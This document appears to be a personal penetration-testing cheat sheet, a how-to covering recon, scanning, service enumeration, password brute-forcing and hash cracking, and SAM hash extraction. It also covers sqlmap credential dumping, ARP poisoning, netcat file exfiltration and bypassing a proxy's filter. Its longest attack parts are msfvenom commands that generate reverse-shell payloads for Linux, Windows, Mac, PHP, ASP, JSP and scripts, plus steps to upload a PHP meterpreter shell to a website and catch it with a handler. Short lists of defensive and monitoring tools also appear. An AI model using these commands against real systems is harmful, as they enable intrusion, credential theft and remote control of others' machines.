1. www.txt2re.com == good page to generate regular expression

2. advanced subnet calculator == win program really good for network calculations (also in Android)

3. mailinator == mail without a mail

4. http://www.outpost9.com/files/WordLists.html == different wordlist download

5. http://proxytunnel.sourceforge.net/ == script that also provide a basic non-interactive shell on remote systems behind firewalls

6. https://www.virustotal.com/en/ == check for viruses on file, web page or ip etc.

7. https://wigle.net/ and https://www.google.pl/maps/ == best for recon purpose

8. https://www.phishtank.com/ == I can check if web page is used for fishing purposes

9. https://www.shodan.io/ == is a search engine that lets the user find specific types of computers 
(web cams, routers, servers, etc.) connected to the internet using a variety of filters. 
Some have also described it as a search engine of service banners, which are meta-data the server sends back to the client.
[1] This can be information about the server software, what options the service supports, 
a welcome message or anything else that the client can find out before interacting with the server. 
Shodan collects data mostly on web servers (HTTP/HTTPS - port 80, 8080, 443, 8443), 
as well as FTP (port 21), SSH (port 22), Telnet (port 23), SNMP (port 161), 
SIP (port 5060),and Real Time Streaming Protocol (RTSP, port 554)

==============================================================
1. http://www.blackviper.com/ == for service configuration on windows

2. driver easy == best for installing windows drivers

3. https://www.sans.org/security-resources/policies == Information Security Policy Templates

4. https://www.cloudflare.com == protects from DDoS (good cloud solution)

5. https://www.fail2ban.org == Fail2ban scans log files (e.g. /var/log/apache/error_log) and bans IPs that show the malicious signs

6. https://www.snort.org/ == Network Intrusion Detection & Prevention System

7. https://www.modsecurity.org/ == good Open Source Web Application Firewall

8. https://ossec.github.io/ == free, open-source host-based intrusion detection system (HIDS)

9. https://www.microsoft.com == EMET (Enhanced Mitigation Experience Toolkit) for risk and management on Windows up from 7

10. https://suhosin.org == great for PHP protection (web sites and application)

==============================================================
==============================================================

1. RECON
==> What to looking at ?
    whois, netcraft 
    • whois == info about domain. Also http://whois.domaintools.com/ 
    • https://www.netcraft.com/ == check web fro systems and others (passive) 

==> DNS by the nslookup
    • nslookup (passive)
    • To perform a DNS lookup, simply enter the domain or subdomain you would like to query and press enter on your keyboard.
    • The set type command will let you query a particular type of DNS record. 
      For example, if you wanted to check the MX (mail) records for a particular domain, you would type the following:
      >set type=mx
    • You can now perform another lookup on the domain name, and only the MX records will be returned.
    • Change the server. When you first start NSLookup it will query your local DNS server. 
      This is likely to be your router or Internet Service Provider's DNS servers. 
      As a result, you may not also receive accurate results, as the server you are querying may not exist 
      in your local DNS server. NSLookup allows you to change the nameserver you query, 
      to ensure you query a nameserver from which you are guaranteed to get an accurate result. 
      If you query the nameserver listed against the domain name you will receive an authoritative answer, 
      because the nameserver has authority over the DNS for the domain name. 
      Start by retrieving the nameserver's for the domain name by using the set type command and then querying the domain.
      >set type=ns
      >mineDomain.com
    • You can see from the results that mineDomain.com has two nameserver's, ns1.livedns.co.uk and ns2.livedns.co.uk. 
      We can now switch NSlookup to query one of those authoritative nameserver's for this domain name.
      >server ns1.livedns.co.uk
    • set type is still set to query nameserver records, so change the type back to query the record you need 
      (for example A record, MX record). In this example we shall retrieve the A records for the domain.
      >set type=a
    • And finally, query the domain name.
      >mineDomain.com
    • addition
      >set type=cname == set for lookup primary server
      >set type=soa == check for authoritative server
    • show "zone transfer" (everything about their computers)
      >server ip.number.from.ping
      >set type=any
      >ls -d lol.org
      
==> Specify a network range (tracerout & whois)

==> Search simple and by the google search database
    • "something" funny == must contains exactly word something 
    • banana -loki == every web contains banana but not loki word 
    • cache:www.lolo.pl == cache for cached page (something like archive.org bot not witch their power) 
    • link:www.lolol.pl == show web page that have link to my target 
    • related:www.lolo.pl == show similar web page 
    • allinurl:lolo.pl == show the sites conteins "lolo.pl" in their url (very similar to inurl:) 
    • intitle:"index of" == show web page witch got "index of" in page title (in that example structure directory) 
      very similar to allintitle:
      
==> google hacking database is sweet
    
==> Website search by time back machine and more
    • archive.org == beck to the past 
    • dogpile.com == is a metasearch engine for information on the World Wide Web that fetches results from Google, Yahoo!
      and Yandex, and includes results from several other popular search engines, including those from 
      audio and video content providers 
    • httrack == download all web-page (also on Linux ??) (passive) 
    • burpsiut 
    
==> Email. Simple send a offer and look what back to you

==> Check what competitors do

==> Check social media. Do social engineering

==> Sum it up

==============================================================
==============================================================

2. Scanning

==> Be anonymous
    • Proxychains 
      >emacs -nw /etc/proxychains.conf
    • Search for add proxy hear and add main proxy. Default is 127.0.0.1 on port 9050 (the default Tor configuration) 
      but I can use different. Save file ! And now magic (everything goes by set up proxy)
      >proxychains nmap -sS 8.26.65.101
    • Anonymizers
    • good for that is Hackplayers/4nonimizer all is described on their git repo 
==> Use proper tools
    • NETDISCOVER
    - only on kali. This tool discover the IP's on an internal network -r switch (for range) and then in CIDR. 
      Example scan:
      >netdiscover -r 192.168.1.0/24
    • FIREWALK
    - attempts to determine what layer 4 protocols a given IP forwarding device will pass 
    - Scan ports 8079-8081 (-S8079-8081) through the eth0 interface (-i eth0), do not resolve hostnames (-n), 
      use TCP (-pTCP) via the gateway (192.168.1.1) against the target IP (192.168.0.1): 
      >firewalk -S8079-8081 -i eth0 -n -pTCP 192.168.1.1 192.168.0.1
    • NETCAT (nc)
    - helpful in discovering open ports on a machine. 
      >nc -z -vv -w 1 192.168.1.100 20-25
      -z == Zero-I/O mode, report connection status only
      -vv == Use more than once (-vv, -vvv...) for greater verbosity. 
             With -v it will be verbose and display all kinds of useful connection based information
      -w 1 == wait for 1 sec
      20-25 == port range
    • NMAP
      -sN, -sF, -sX == almost the same. Preferable -sN. Good for Unix scan (quiet but may be detected by IDS)
      -sA == only ACK flag. Unfiltered = ACK can reach port but it do not precise state of that port. 
             Ports witch no respond will by classified as filtered. Very safe scan.
      -O == verifies operating system (aggressive)
      -sV == service verification (aggressive)
      -A == combined option -O and -sV + others nmap scripts (very aggressive)
      -f == fragmentation scan creates smaller packages reassemble in target (quiet)
     - spoofing ip (quiet)
       >nmap -D RND 192.168.1.110
       192.168.1.110 == target
     - zombi scan (quiet)
       check if system can perform a scan
       >nmap --script ipidseq 192.168.1.0-255
       looking for main zombi ip (Host script results == ipidseq: Incremental) and using it.
       >nmap -sI 192.168.1.100 -Pn 192.168.1.111
       -sI == idle(zombi 192.168.1.100 from previous scan)
       -Pn == no ping (target 192.168.1.111)
    - Ps. By nmap I can find a sniffers on the network by simply:
       >nmap --script sniffer-detect 192.168.1.0/24
    • XPROBE2
      - useful program for verifying operating system on the host. Simple: xprobe2 targetIp 
    • OPENVAS
      - use of vulnerability scanner. Another free are MBSA (Windows) and Secunia PSI (Windows). 
        Commercial on the other hand are: Nessus, Retina, CORE Impact, Nexpose itd.
    • SPARTA
    - SPARTA is a python GUI application which simplifies network infrastructure penetration testing 
      by aiding the penetration tester in the scanning and enumeration phase. 
    - this is a great tool that combines many different tools not only for scanning and enumeration 
      but also for hydra brute-force attack
    • also useful/actual vulnerabilities
    - national vulnerability databases web page (https://nvd.nist.gov/) 
    - https://www.securityfocus.com/ 
    - http://cve.mitre.org/ 
    - https://0day.today/ 
    • I can check for potential flaws using a fuzzers like intruder in BurpSiut.
    • Lists for payloads may came from different places. For example kali wordlists. 
      But great place to start is https://github.com/fuzzdb-project/fuzzdb 

3. Enumeration

If I don't have any users name, e-mail, information about users after a recon phase, I may use enumeration technique. This provides information I mention above and many more (system information, used disks, groups of users etc.)
I may use enumeration either whey to additional check a data I poses and all the goodies above it :)
PS Always look at auxiliary/scanner/ for enumerators in metasploit

    • NetBios in WindowsXP
    - For that SuperScan by MCAffe. This is a simple windows program.
    • Enumeration by SNMP (Simple Network Management Protocol)
    - Default passwords are "public" or "private" 
    - use metasploit and auxiliary/scanner/snmp/snmp_login for checking above passwords.
    - If results are ok then use auxiliary/scanner/snmp/snmp_enum 
    • Enumeration by LDAP (for example Active Directory; AD is database of user accounts and many more on Windows)
    - Open ports that suggest a presence of that service == 389, 636, 3268, 3268 
    - First above ports must be open 
    - Second I can use JXplorer and try login to the target like Anonymous user with no passwords
      Hint** use Table Editor after go to the directory 
    • Enumeration by SMTP (Simple Mail Transfer Protocol)
    - ports 25 and 587 (submission) 
    - use metasploit and auxiliary/scanner/smtp/smtp_version for checking.
    - if results are ok then use auxiliary/scanner/smtp/smtp_enum 
    - after that I may also search executable program smtp-user-enum.pl
    - when I run it (./smtp-user-enum.pl) I get help options. Example usage is
        >./smtp-user-enum.pl -M VRFY -U userList.txt -t 192.168.1.120 
    • Enumeration by DNS
    - Port 53 (UDP or TCP) 
    - nslookup on the first place 
    - then is something like dnsrecon simply use 
        >dnsrecon -d strona.org for lookup 
        or
        >dnsrecon -r 192.168.1.120-192.168.1.139 for reverse lookup
    - for zone walking 
        >dnsrecon -d strona.org -t zonewalk 
    • Enumeration by SMB (Server Message Block; for example cifs)
    - Open ports that suggest a presence of that service == 25 
    - use metasploit and auxiliary/scanner/smb/smb_enumusers 
    • Enumeration by SSH (Secure Shell)
    - Open ports that suggest a presence of that service == 22 
    - use metasploit and auxiliary/scanner/ssh/ssh_enumusers 
    • Web page (written in wordpress) enumeration
        >wpscan --url http://10.0.2.8/beckup-wordpres --enumerate p 
    - where p option is for plugins (more on that after wpscan -h) 
    - sometime is good idea to add wp_content_dir (more on that in wpscan -h) 

4. Command_Steps
   Always check if passwords find in one place is valid in different systems and application for that user 

    • medusa
    - for brutforce passwords. 
    - display all modules currently installed 
      >medusa -d
    - display specific options for a given module (in this example smbnt) 
      >medusa -M smbnt -q
    - I can try for example to hack mysql 
      >medusa -h 192.168.1.120 -u root -p password -e ns -O mysql.medusa.out -M mysql
    • hydra
    - also useful and nice for that job 
      >hydra -L /fileWithUserNames.txt -e ns 192.168.1.25 ssh
      >hydra -L /fileWithUserNames.txt -P /PasswordsList.txt -e ns 192.168.1.25 ssh
       -e option allows search not defined (n) and passwords same like user-name (s)
    • john
    - for the shadow files 
      >john -wordlist=/path/to/file/with/passwords.txt ~/preperd/shadowFile.txt
    - we can use configure file to create more sophisticated word list http://contest-2010.korelogic.com/rules.html
      They can be viewed and added to in the file located at _/etc/john/john.conf under ‘#Wordlist mode rules’
      To perform modifications according to these rules run the following command 
      >john -wordlist=rockyou.txt -rules -stdout > rockyouslownikpo.txt
    - shadowFile.txt without big changes, removing "empty users" and we are ready to go 
    - john can be used without wordlist. Then I can use specific format (nt2 is for windows ntlm, lm hashes)
      PS: I can check the format by john /root/fileWithHAsh.txt 
      >john /root/fileWithHAsh.txt -format=nt2 -users=userName -show
    - and I can use a brute force without a dictionary 
      >john -incremental:lanman /root/fileWithHAsh.txt
       lanman – Letters, numbers, and some special characters.
       alpha – Letters only.
       digits – Numbers only.
       all – All possible characters.
    - I can also store a session and back to it atelier 
      >john -incremental:lanman /root/fileWithHAsh.txt -session=nameOfSesion
    - restore by
      >john -restore=nameOfSesion
• hashcat
    - great like john 
      >hashcat -a 0 -m 500 hash.txt wordlist.txt
       -a == attack mode and 0 = straight (more in man)
       -m == hash type and 500 = md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5 (much more in man)
    - hash.txt is modified shadow file (remove "empty users", remove users name, remove last sings (only HASH)) 
• strings
    - great command to pull string out of core files and many more 
• NFS (Network File Shares)
    - I can check if I can mount some shares in a target system (in metasploit)
      >use auxiliary/scanner/nfs/nfsmount 
    - After that I know if I can mount something simple like that
      >mkdir /tmp/metasploitable
      >mount -o nolock -t nfs 10.10.10.125:/ /tmp/metasploitable 
       10.10.10.125:/ ==> is a "/" directory on a target "10.10.10.125"
• VNC (Virtual Network Computing)
    - remote access to the target. I can check if it is possible to use vnc without any credentials 
      (like always matasploit is the best)
      >use auxiliary/scanner/vnc/vnc_none_auth
    - if I got credentials I may use it as well with the above exploit
• Windows
    - getting system and a sam file 
    - both file contain a hashes for crack. They are located in Windows/System32/Config 
    - Bkhive and samdump2 work together to extract Windows password hashes from the SAM and SYSTEM files. 
    - for get system file:
      >bkhive system /root/fileToPutHiveResults.txt 
    - for get sam file:
      >samdump2 SAM /root/fileToPutHiveResults.txt > /root/hash.txt 
• sqlmap
    - sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL 
      injection flaws and taking over of database servers. 
    - example show web page witch potential sql with checking if current user is administrator and check current database
      >sqlmap -u http://192.168.1.120/products.php?id=1 --current-user --is-dba --current-db 
    - example 2 take users names and their passwords
      >sqlmap -u http://192.168.1.120/products.php?id=1 --users --passwords 
• setoolkit
    - For use of ready to go trojans 
• msfvenom
    - For creating your own trojans with default settings 
    - It is fun thing. I can use it for example to create php payload. Steps to do are: 
      1. Creating a payload
         >msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.15 LPOTR=6000 -e php/base64 -f raw > exploit.php
          With -f i can precise format (i could use .exe for example if i don`t whant to use php exploit).
          The ip 10.0.2.15 is the attacker address. 
      2. Add to exploit.php == <?php in the begining of the file and ?> to the end 
      3. Upload that payload to the web page 
      4. use exploit/multi/handler on msfconsole 
      5. Set LHOST and LPOTR like in peyload (attacker ip and listening port) 
      6. exploit 
      7. go to the uploaded file www.lol.pl/uploadfiles/exploit.php 
      8. That is it. I got meterpreter console on metasploit :) 

5. Can I Arp Poison (Sniffing)
• direct all communication from target to attacker system:
  >etercap -T -M arp:oneway /192.168.1.100/ 
• for more, I can use programs like "Dsnif" or "Cain and Able" 
• etercap is also good for dns spoof (it is possible to use a graphical interface etercap) 


MANY MORE

• Dirs
/usr/share/wordlists
/etc/rc.d
/var/log
/etc/nologin
/etc/fstab
/var/spool/mail
/etc/securetty
/var/mail "standard for fetchmail"
/var/tmp
/proc "many things from that == process information pseudo-file system"
/dev/null "trash conteiner for many crontab tasks"

• File_transer_by_Netcat
    - Create a listener on Mine machine and pipe the traffic from the input into a file
      >nc -lvvp 4444 > file_to_download.txt
       -l == State that we are going to be listening
       -vv == Show extra verbosity
       -p == We are going to supply a port for listening
       4444 == This is the port will be listening on
     - Back on the ssh session of the target machine we are going to transfer the file through netcat to the listening 
       port on our local machine
       >nc -nvv 192.168.1.141 4444 < file_to_download.txt
        -n == do not resolve IP address using DNS
     - Be aware that netcat will not tell you once the file has finished transferring. It is a good idea to open 
       another shell and do ls -ls salary_dec2004.csv.enc to check when the file has stopped increasing in size.

• How to download ".exe", ".gz" and ".zip" when they blocked
Fortunately, most proxy administrators can not write regular expressions very well. At one site I know (let's call them BigAcme corporation), the proxies check for URL that end in the well known extensions ".exe", ".gz" and ".zip". Nobody cared to inform the proxy admins that bzip2 exists, so downloading ".bz2" files is allowed... :-). Furthermore, since URLs are allowed to contain a "query string" (for passing in form field values through an HTTP GET), adding a "?x" to a download URL fools the regular expression filters but does not destroy the validity of the URL. More often than not, the server on the other side processes the query string and then happily ignores it. I have downloaded many a vendor patch and open source product that way.

• Monitoring My System
  -- TCPView (Windows)
    TCPView is a Windows program that will show you detailed listings of all TCP and UDP endpoints on your system, 
    including the local and remote addresses and state of TCP connections. On Windows Server 2008, Vista, and XP, TCPView 
    also reports the name of the process that owns the endpoint. TCPView provides a more informative and conveniently presented
    subset of the Netstat program that ships with Windows. The TCPView download includes Tcpvcon, a command-line version with
    the same functionality.
    - on Linux i can use Wireshark
  -- Autoruns (Windows)
    This utility, which has the most comprehensive knowledge of auto-starting locations of any startup monitor, 
    shows you what programs are configured to run during system bootup or login, and when you start various built-in 
    Windows applications like Internet Explorer, Explorer and media players. These programs and drivers include ones 
    in your startup folder, Run, RunOnce, and other Registry keys. Autoruns reports Explorer shell extensions, toolbars, 
    browser helper objects, Winlogon notifications, auto-start services, and much more. Autoruns goes way beyond 
    other autostart utilities.
    Autoruns' Hide Signed Microsoft Entries option helps you to zoom in on third-party auto-starting images that have been 
    added to your system and it has support for looking at the auto-starting images configured for other accounts configured 
    on a system. Also included in the download package is a command-line equivalent that can output in CSV format, Autorunsc.
    - on Linux:
      1. ps aux | less
      2. top ==> h for help
      3. pstree ==> shows running processes as a tree
      4. ps -eM ==> get security info
      5. atop and htop also are weary useful tools
   -- DriverView (Windows)
     DriverView utility displays the list of all device drivers currently loaded on your system. For each driver in the list,
     additional useful information is displayed: load address of the driver, description, version, product name, company 
     that created the driver, and more.
     - for Linux i can use great tool like "inxi" (use -F for full information, in man is match more information about it)
   -- System File Checker (Windows)
      Repair missing or corrupted system files. It is preinstalled on new Windows
      for help 
      >sfc /?
      for scan 
      >sfc /scannow
      - for Linux "Tripwire open source". It is much more then checker because it is a free IDS system

• msfvenom OPERATION
Often one of the most useful (and to the beginner underrated) abilities of Metasploit is the msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address (LAN IP if attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.
List payloads
msfvenom -l
Binaries
Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
Mac
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
Web Payloads
PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
Scripting Payloads
Python
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
Bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
Shellcode
For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.
Linux Based Shellcode
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
Windows Based Shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
Mac Based Shellcode
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language> Handlers
Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘


